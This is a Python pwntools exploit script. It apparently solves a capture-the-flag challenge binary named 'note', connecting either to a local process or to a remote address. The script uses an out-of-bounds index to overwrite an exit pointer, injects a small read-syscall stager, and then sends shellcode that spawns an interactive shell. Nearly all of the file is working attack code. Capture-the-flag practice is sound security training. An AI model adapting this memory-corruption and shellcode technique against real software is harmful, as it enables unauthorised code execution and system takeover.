#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./note"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("58.20.46.151",41214)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

r.recvline()
r.send("1"+"\x00"*9)
r.send("1"+"\x00"*14)
debug()
array = 0x5555555580A0
exit = 0x555555558060
r.send("13".ljust(10,"\x00")+p32(((exit-array)/8)&0xffffffff)+"\x00")

shellcode = """
start:
    syscall
    xor rax,rax
    mov rsi,rcx
    mov edx,r11d
    syscall
"""
code = asm(shellcode,arch="amd64")
assert len(code) <= 0xd
r.send(code.ljust(0xd,"\x00"))

r.sendline("5")
shellcode= """
    mov rax,SYS_setuid
    xor rdi,rdi
    syscall"""
payload = asm(shellcraft.amd64.sh(),arch="amd64")
r.sendline(payload)
r.interactive()
